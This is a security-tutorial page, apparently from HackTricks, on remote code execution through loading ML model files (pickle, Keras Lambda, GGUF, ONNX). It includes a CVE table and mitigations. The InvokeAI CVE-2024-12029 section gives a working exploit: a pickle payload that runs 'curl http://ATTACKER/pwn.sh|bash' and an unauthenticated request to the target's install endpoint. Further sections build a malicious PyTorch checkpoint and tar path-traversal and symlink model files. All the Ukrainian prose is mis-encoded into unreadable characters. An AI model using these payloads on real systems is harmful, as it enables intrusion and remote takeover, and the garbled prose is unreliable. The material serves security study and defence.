# Models RCE

{{#include ../banners/hacktricks-training.md}}

## –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥–µ–ª–µ–π –¥–æ RCE

–ú–æ–¥–µ–ª—ñ –º–∞—à–∏–Ω–Ω–æ–≥–æ –Ω–∞–≤—á–∞–Ω–Ω—è –∑–∞–∑–≤–∏—á–∞–π –ø–æ—à–∏—Ä—é—é—Ç—å—Å—è –≤ —Ä—ñ–∑–Ω–∏—Ö —Ñ–æ—Ä–º–∞—Ç–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ ONNX, TensorFlow, PyTorch —Ç–æ—â–æ. –¶—ñ –º–æ–¥–µ–ª—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –Ω–∞ –∫–æ–º–ø'—é—Ç–µ—Ä–∏ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫—ñ–≤ –∞–±–æ –≤ –ø—Ä–æ–¥—É–∫—Ü—ñ–π–Ω—ñ —Å–∏—Å—Ç–µ–º–∏ –¥–ª—è —ó—Ö –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è. –ó–∞–∑–≤–∏—á–∞–π –º–æ–¥–µ–ª—ñ –Ω–µ –ø–æ–≤–∏–Ω–Ω—ñ –º—ñ—Å—Ç–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥, –∞–ª–µ —î –≤–∏–ø–∞–¥–∫–∏, –∫–æ–ª–∏ –º–æ–¥–µ–ª—å –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ —è–∫ –ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –∞–±–æ —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —É –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥–µ–ª—ñ.

–ù–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è —Ü–µ –¥–µ—è–∫—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞–∫–æ–≥–æ —Ç–∏–ø—É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π:

| **–§—Ä–µ–π–º–≤–æ—Ä–∫ / –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç**  | **–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å (CVE, —è–∫—â–æ –¥–æ—Å—Ç—É–ø–Ω–æ)**                                                                 | **RCE –í–µ–∫—Ç–æ—Ä**                                                                                                                         | **–ü–æ—Å–∏–ª–∞–Ω–Ω—è**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *–ù–µ–±–µ–∑–ø–µ—á–Ω–∞ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –≤* `torch.load` **(CVE-2025-32434)**                                                              | –®–∫—ñ–¥–ª–∏–≤–∏–π pickle —É –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ñ–π —Ç–æ—á—Ü—ñ –º–æ–¥–µ–ª—ñ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É (–æ–±—Ö—ñ–¥ –∑–∞—Ö–∏—Å—Ç—É `weights_only`)                                   | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó –º–æ–¥–µ–ª—ñ –≤–∏–∫–ª–∏–∫–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É; –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è Java RCE –≤ API —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è                                   | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (–Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–π YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥–µ–ª—ñ –∑ YAML –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `yaml.unsafe_load` (–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É) <br> –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥–µ–ª—ñ –∑ **Lambda** —à–∞—Ä–æ–º –≤–∏–∫–æ–Ω—É—î –¥–æ–≤—ñ–ª—å–Ω–∏–π Python –∫–æ–¥ | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (–ø–∞—Ä—Å–∏–Ω–≥ TFLite)                                                                                          | –°—Ñ–æ—Ä–º–æ–≤–∞–Ω–∞ –º–æ–¥–µ–ª—å `.tflite` –≤–∏–∫–ª–∏–∫–∞—î –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Ü—ñ–ª–æ–≥–æ —á–∏—Å–ª–∞ ‚Üí –ø–æ—à–∫–æ–¥–∂–µ–Ω–Ω—è –∫—É–ø–∏ (–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π RCE)                                     | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥–µ–ª—ñ —á–µ—Ä–µ–∑ `joblib.load` –≤–∏–∫–æ–Ω—É—î pickle –∑ payload `__reduce__` –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞                                               | |
| **NumPy** (Python)          | **CVE-2019-6446** (–Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–π `np.load`) *—Å—É–ø–µ—Ä–µ—á–∫–∞*                                                                              | `numpy.load` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –æ–±'—î–∫—Ç–Ω–∏—Ö –º–∞—Å–∏–≤—ñ–≤ ‚Äì —à–∫—ñ–¥–ª–∏–≤–∏–π `.npy/.npz` –≤–∏–∫–ª–∏–∫–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É                     | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (–ø–µ—Ä–µ—Ö—ñ–¥ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó) <br> **CVE-2024-5187** (–ø–µ—Ä–µ—Ö—ñ–¥ tar)                                                    | –ó–æ–≤–Ω—ñ—à–Ω—ñ–π —à–ª—è—Ö –≤–∞–≥ –º–æ–¥–µ–ª—ñ ONNX –º–æ–∂–µ –≤–∏–π—Ç–∏ –∑–∞ –º–µ–∂—ñ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó (—á–∏—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤) <br> –®–∫—ñ–¥–ª–∏–≤–∞ –º–æ–¥–µ–ª—å ONNX tar –º–æ–∂–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ —Ñ–∞–π–ª–∏ (–ø—Ä–∏–∑–≤–æ–¥—è—á–∏ –¥–æ RCE) | |
| ONNX Runtime (—Ä–∏–∑–∏–∫ –¥–∏–∑–∞–π–Ω—É)  | *(–ù–µ–º–∞—î CVE)* –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó ONNX / –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π –ø–æ—Ç—ñ–∫                                                                 | –ú–æ–¥–µ–ª—å –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–º –≤–∏–º–∞–≥–∞—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞; —Å–∫–ª–∞–¥–Ω—ñ –≥—Ä–∞—Ñ–∏ –º–æ–¥–µ–ª–µ–π –∑–ª–æ–≤–∂–∏–≤–∞—é—Ç—å –ª–æ–≥—ñ–∫–æ—é –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∏—Ö –æ–±—á–∏—Å–ª–µ–Ω—å | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (–ø–µ—Ä–µ—Ö—ñ–¥ —à–ª—è—Ö—É)                                                                                          | –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è API –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥–µ–ª—ñ –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º `--model-control` –¥–æ–∑–≤–æ–ª—è—î –≤—ñ–¥–Ω–æ—Å–Ω–∏–π –ø–µ—Ä–µ—Ö—ñ–¥ —à–ª—è—Ö—É –¥–ª—è –∑–∞–ø–∏—Å—É —Ñ–∞–π–ª—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–∑–∞–ø–∏—Å `.bashrc` –¥–ª—è RCE) | |
| **GGML (—Ñ–æ—Ä–º–∞—Ç GGUF)**      | **CVE-2024-25664 ‚Ä¶ 25668** (–±–∞–≥–∞—Ç–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω—å –∫—É–ø–∏)                                                                         | –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ñ–∞–π–ª –º–æ–¥–µ–ª—ñ GGUF –≤–∏–∫–ª–∏–∫–∞—î –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –∫—É–ø–∏ –≤ –ø–∞—Ä—Å–µ—Ä—ñ, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ –∂–µ—Ä—Ç–≤–∏         | |
| **Keras (—Å—Ç–∞—Ä—ñ —Ñ–æ—Ä–º–∞—Ç–∏)**   | *(–ù–µ–º–∞—î –Ω–æ–≤–∏—Ö CVE)* –°–ø–∞–¥–∫–æ–≤–∏–π Keras H5 –º–æ–¥–µ–ª—å                                                                                         | –®–∫—ñ–¥–ª–∏–≤–∞ HDF5 (`.h5`) –º–æ–¥–µ–ª—å –∑ –∫–æ–¥–æ–º Lambda —à–∞—Ä—É –≤—Å–µ —â–µ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ (—Ä–µ–∂–∏–º –±–µ–∑–ø–µ–∫–∏ Keras –Ω–µ –æ—Ö–æ–ø–ª—é—î —Å—Ç–∞—Ä–∏–π —Ñ–æ—Ä–º–∞—Ç ‚Äì ‚Äú–∞—Ç–∞–∫–∞ –∑ –ø–æ–Ω–∏–∂–µ–Ω–Ω—è‚Äù) | |
| **–Ü–Ω—à—ñ** (–∑–∞–≥–∞–ª—å–Ω—ñ)        | *–ù–µ–¥–æ–ª—ñ–∫ –¥–∏–∑–∞–π–Ω—É* ‚Äì —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è Pickle                                                                                         | –ë–∞–≥–∞—Ç–æ ML —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ñ–æ—Ä–º–∞—Ç–∏ –º–æ–¥–µ–ª–µ–π –Ω–∞ –æ—Å–Ω–æ–≤—ñ pickle, Python `pickle.load`) –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏–º—É—Ç—å –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥, –≤–±—É–¥–æ–≤–∞–Ω–∏–π —É —Ñ–∞–π–ª–∏ –º–æ–¥–µ–ª–µ–π, —è–∫—â–æ –Ω–µ –≤–∂–∏—Ç–∏ –∑–∞—Ö–æ–¥—ñ–≤ | |

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —î –¥–µ—è–∫—ñ –º–æ–¥–µ–ª—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ python pickle, —Ç–∞–∫—ñ —è–∫ —Ç—ñ, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è [PyTorch](https://github.com/pytorch/pytorch/security), —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ, —è–∫—â–æ —ó—Ö –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∑ `weights_only=True`. –û—Ç–∂–µ, –±—É–¥—å-—è–∫–∞ –º–æ–¥–µ–ª—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ pickle –º–æ–∂–µ –±—É—Ç–∏ –æ—Å–æ–±–ª–∏–≤–æ –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ —Ü—å–æ–≥–æ —Ç–∏–ø—É –∞—Ç–∞–∫, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–æ–Ω–∏ –Ω–µ –≤–∫–∞–∑–∞–Ω—ñ –≤ —Ç–∞–±–ª–∏—Ü—ñ –≤–∏—â–µ.

### üÜï  InvokeAI RCE —á–µ—Ä–µ–∑ `torch.load` (CVE-2024-12029)

`InvokeAI` ‚Äì —Ü–µ –ø–æ–ø—É–ª—è—Ä–Ω–∏–π –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –≤–µ–±-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è Stable-Diffusion. –í–µ—Ä—Å—ñ—ó **5.3.1 ‚Äì 5.4.2** –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å REST-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å `/api/v2/models/install`, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –º–æ–¥–µ–ª—ñ –∑ –¥–æ–≤—ñ–ª—å–Ω–∏—Ö URL-–∞–¥—Ä–µ—Å.

–í–Ω—É—Ç—Ä—ñ—à–Ω—å–æ —Ü–µ–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç –≤–∏–∫–ª–∏–∫–∞—î:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
–ö–æ–ª–∏ –Ω–∞–¥–∞–Ω–∏–π —Ñ–∞–π–ª —î **PyTorch checkpoint (`*.ckpt`)**, `torch.load` –≤–∏–∫–æ–Ω—É—î **–¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é pickle**. –û—Å–∫—ñ–ª—å–∫–∏ –≤–º—ñ—Å—Ç –Ω–∞–¥—Ö–æ–¥–∏—Ç—å –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ URL, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–±—É–¥—É–≤–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –æ–±'—î–∫—Ç –∑ –∫–∞—Å—Ç–æ–º–Ω–∏–º –º–µ—Ç–æ–¥–æ–º `__reduce__` –≤—Å–µ—Ä–µ–¥–∏–Ω—É –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ—ó —Ç–æ—á–∫–∏; –º–µ—Ç–æ–¥ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è **–ø—ñ–¥ —á–∞—Å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó**, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ **–≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É (RCE)** –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ InvokeAI.

–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±—É–ª–∞ –ø—Ä–∏—Å–≤–æ—î–Ω–∞ **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### –ü—Ä–æ—Ü–µ—Å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó

1. –°—Ç–≤–æ—Ä—ñ—Ç—å —à–∫—ñ–¥–ª–∏–≤—É –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É —Ç–æ—á–∫—É:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. –†–æ–∑–º—ñ—Å—Ç—ñ—Ç—å `payload.ckpt` –Ω–∞ HTTP-—Å–µ—Ä–≤–µ—Ä—ñ, —è–∫–∏–º –≤–∏ –∫–µ—Ä—É—î—Ç–µ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `http://ATTACKER/payload.ckpt`).
3. –í–∏–∫–ª–∏—á—Ç–µ –≤—Ä–∞–∑–ª–∏–≤—É —Ç–æ—á–∫—É –¥–æ—Å—Ç—É–ø—É (–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–∞):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. –ö–æ–ª–∏ InvokeAI –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î —Ñ–∞–π–ª, –≤—ñ–Ω –≤–∏–∫–ª–∏–∫–∞—î `torch.load()` ‚Üí –≥–∞–¥–∂–µ—Ç `os.system` –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è, —ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –æ—Ç—Ä–∏–º—É—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –ø—Ä–æ—Ü–µ—Å—É InvokeAI.

–ì–æ—Ç–æ–≤–∏–π –µ–∫—Å–ø–ª–æ–π—Ç: **Metasploit** –º–æ–¥—É–ª—å `exploit/linux/http/invokeai_rce_cve_2024_12029` –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É—î –≤–µ—Å—å –ø—Ä–æ—Ü–µ—Å.

#### –£–º–æ–≤–∏

‚Ä¢  InvokeAI 5.3.1-5.4.2 (–ø—Ä–∞–ø–æ—Ä —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **false**)
‚Ä¢  `/api/v2/models/install` –¥–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞
‚Ä¢  –ü—Ä–æ—Ü–µ—Å –º–∞—î –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ –æ–±–æ–ª–æ–Ω–∫–∏

#### –ó–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏

* –û–Ω–æ–≤—ñ—Ç—å –¥–æ **InvokeAI ‚â• 5.4.3** ‚Äì –ø–∞—Ç—á –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î `scan=True` —ñ –≤–∏–∫–æ–Ω—É—î —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ü–ó –ø–µ—Ä–µ–¥ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é.
* –ü—Ä–∏ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–º—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏—Ö —Ç–æ—á–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `torch.load(file, weights_only=True)` –∞–±–æ –Ω–æ–≤–∏–π [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) –¥–æ–ø–æ–º—ñ–∂–Ω–∏–π –∑–∞—Å—ñ–±.
* –í–ø—Ä–æ–≤–∞–¥—å—Ç–µ —Å–ø–∏—Å–∫–∏ –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö / –ø—ñ–¥–ø–∏—Å–∏ –¥–ª—è –¥–∂–µ—Ä–µ–ª –º–æ–¥–µ–ª–µ–π —ñ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ —Å–µ—Ä–≤—ñ—Å –∑ –Ω–∞–π–º–µ–Ω—à–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

> ‚ö†Ô∏è –ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ **–±—É–¥—å-—è–∫–∏–π** —Ñ–æ—Ä–º–∞—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ Python pickle (–≤–∫–ª—é—á–∞—é—á–∏ –±–∞–≥–∞—Ç–æ —Ñ–∞–π–ª—ñ–≤ `.pt`, `.pkl`, `.ckpt`, `.pth`) —î –≤–∫—Ä–∞–π –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–º –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –∑ –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª.

---

–ü—Ä–∏–∫–ª–∞–¥ –∞–¥-—Ö–æ–∫ –∑–∞—Ö–æ–¥—É –±–µ–∑–ø–µ–∫–∏, —è–∫—â–æ –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —Å—Ç–∞—Ä—ñ –≤–µ—Ä—Å—ñ—ó InvokeAI, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –∑–∞ –∑–≤–æ—Ä–æ—Ç–Ω–∏–º –ø—Ä–æ–∫—Å—ñ:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## –ü—Ä–∏–∫–ª–∞–¥ ‚Äì —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ PyTorch –º–æ–¥–µ–ª—ñ

- –°—Ç–≤–æ—Ä—ñ—Ç—å –º–æ–¥–µ–ª—å:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –º–æ–¥–µ–ª—å:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## –ú–æ–¥–µ–ª—ñ –¥–ª—è –æ–±—Ö–æ–¥—É —à–ª—è—Ö—ñ–≤

–Ø–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –±–ª–æ–∑—ñ**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), –±—ñ–ª—å—à—ñ—Å—Ç—å —Ñ–æ—Ä–º–∞—Ç—ñ–≤ –º–æ–¥–µ–ª–µ–π, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Ä—ñ–∑–Ω–∏–º–∏ AI —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∞–º–∏, –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ –∞—Ä—Ö—ñ–≤–∞—Ö, –∑–∞–∑–≤–∏—á–∞–π `.zip`. –¢–æ–º—É –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º–∏ —Ñ–æ—Ä–º–∞—Ç–∞–º–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫ –æ–±—Ö–æ–¥—É —à–ª—è—Ö—ñ–≤, —â–æ –¥–æ–∑–≤–æ–ª—è—î —á–∏—Ç–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ —Ñ–∞–π–ª–∏ –∑ —Å–∏—Å—Ç–µ–º–∏, –¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –º–æ–¥–µ–ª—å.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–æ–¥—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –º–æ–¥–µ–ª—å, —è–∫–∞ —Å—Ç–≤–æ—Ä–∏—Ç—å —Ñ–∞–π–ª —É –∫–∞—Ç–∞–ª–æ–∑—ñ `/tmp`, –∫–æ–ª–∏ –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
–ê–±–æ, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–æ–¥—É, –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –º–æ–¥–µ–ª—å, —è–∫–∞ —Å—Ç–≤–æ—Ä–∏—Ç—å —Å–∏–º–≤–æ–ª—ñ—á–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é `/tmp`, –∫–æ–ª–∏ –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

